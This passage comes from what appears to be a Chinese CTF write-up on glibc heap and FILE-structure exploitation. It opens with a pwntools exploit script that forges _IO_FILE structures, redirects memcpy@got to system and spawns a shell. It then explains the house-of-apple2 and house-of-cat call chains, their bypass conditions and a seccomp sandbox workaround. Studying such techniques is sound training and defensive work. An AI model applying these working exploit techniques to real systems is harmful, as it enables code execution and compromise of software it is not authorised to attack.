class="line">add(<span class="number">0x838</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0xb90</span>)</span><br><span class="line">pld += p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>, pld)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------house of pig----------- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free tcache_struct(size = 0x290) to tcache</span></span><br><span class="line">new_size = <span class="number">0x408</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x10</span>     <span class="comment"># tcache_struct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2d00</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE1 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify tcache_stryct</span></span><br><span class="line">new_size = <span class="number">0x288</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x790</span>    <span class="comment"># data to modify tcache_stryct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2dd0</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE2 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify memcpy@got -&gt; system</span></span><br><span class="line">new_size = <span class="number">0x128</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x1830</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2e90</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE3 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">new_size = <span class="number">0x108</span></span><br><span class="line">copy_heap_addr = heap_base</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE4 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p16(<span class="number">1</span>) * <span class="number">0x20</span> + p64(memcpy_got - <span class="number">0x10</span>) * <span class="number">0x30</span>)     <span class="comment"># tcache struct</span></span><br><span class="line">edit(<span class="number">1</span>, fake_IO_FILE1)</span><br><span class="line">edit(<span class="number">2</span>, fake_IO_FILE2 + fake_IO_FILE3 + fake_IO_FILE4)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(system) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(memset))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Apple2"><a href="#House-Of-Apple2" class="headerlink" title="House_Of_Apple2"></a>House_Of_Apple2</h2><blockquote>
<p>参考文章：[<a href="https://bbs.pediy.com/thread-273832.htm#msg_header_h1_0">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
</blockquote>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是利用FILE结构体中的<code>_wide_data</code>成员和<code>_IO_wfile_jumps</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps_mmap</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close_mmap),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="利用-IO-wfile-overflow函数"><a href="#利用-IO-wfile-overflow函数" class="headerlink" title="利用_IO_wfile_overflow函数"></a>利用<code>_IO_wfile_overflow</code>函数</h4><p>先看一下相关源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line"><span class="comment">// #define _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);		<span class="comment">// 利用点</span></span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_UNBUFFERED        0x0002</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)	<span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// 总结下来就是 *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心利用点和绕过都总结如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags 设置为<span class="number">0</span>即可</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">*(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>调用链：<code>_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<h4 id="利用-IO-wfile-underflow-mmap函数"><a href="#利用-IO-wfile-underflow-mmap函数" class="headerlink" title="利用_IO_wfile_underflow_mmap函数"></a>利用<code>_IO_wfile_underflow_mmap</code>函数</h4><p>先看一下相关源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))		<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_NO_READS          0x0004 /* Reading not allowed.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)	<span class="comment">// 视情况绕过</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);		<span class="comment">// 存在free可利用</span></span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);		<span class="comment">// 关键函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_UNBUFFERED        0x0002</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)	<span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// 总结下来就是 *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心利用点和绕过都总结如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags 设置为0即可</span><br><span class="line">fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">视情况选择：</span><br><span class="line">- fp-&gt;_wide_data-&gt;_IO_save_base == NULL</span><br><span class="line">- free (fp-&gt;_wide_data-&gt;_IO_save_base) -&gt; fp-&gt;_wide_data-&gt;_IO_save_base 合法被free的地址</span><br><span class="line"></span><br><span class="line">*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure>

<p>调用链：<code>_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<h3 id="house-of-cat-强网2022"><a href="#house-of-cat-强网2022" class="headerlink" title="house_of_cat(强网2022)"></a>house_of_cat(强网2022)</h3><p>2.35的堆题，在正式进入堆操作之前有个检查，稍微逆一下就可以出来了，程序只有两次edit的机会，没有退出和main函数返回，所以我们只能通过断言触发IO漏洞，那么两次的edit分别将用于laregbin_attack和修改top_chunk的size。</p>
<p>程序开启了一个特别的sandbox，分析下来在进行read的时候fd要是0才能绕过沙盒，所以我们在open之前可以先<code>close(0)</code>，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0d 0xffffffff  if (A != 0xffffffff) goto 0018</span><br><span class="line"> 0005: 0x15 0x0b 0x00 0x0000013e  if (A == getrandom) goto 0017</span><br><span class="line"> 0006: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0017</span><br><span class="line"> 0007: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0017</span><br><span class="line"> 0008: 0x15 0x08 0x00 0x00000009  if (A == mmap) goto 0017</span><br><span class="line"> 0009: 0x15 0x07 0x00 0x0000000c  if (A == brk) goto 0017</span><br><span class="line"> 0010: 0x15 0x06 0x00 0x000000e7  if (A == exit_group) goto 0017</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0018</span><br><span class="line"> 0014: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0015: 0x15 0x01 0x02 0x00000000  if (A == 0x0) goto 0017 else goto 0018</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>这里用的是<code>_IO_wfile_overflow</code>函数，通过调试发现在执行到<code>setcontext + 61</code>的时候，rdx寄存器保存着我们伪造的<code>_IO_wide_data</code>结构体的首地址，而采用<code>_IO_wfile_underflow_mmap</code>函数执行到<code>setcontext + 61</code>的时候，rdx寄存器只保存了chunk的size，可能需要我们利用一些通用的gadget来纠正rdx的值，所以会比较麻烦。</p>
<p>还有一点，为什么这里要采用<code>IO_wfile_jumps - 0x20</code>呢？因为原本程序是调用<code>xsputn</code>去打印断言信息，且其和<code>_IO_wfile_overflow</code>函数相距0x20字节，所以这样修改偏移，如果希望调用<code>_IO_wfile_underflow_mmap</code>那么只需要将偏移修改成0x18就好。</p>
<p>把IO构造的部分拿出来可以当作模板：</p>
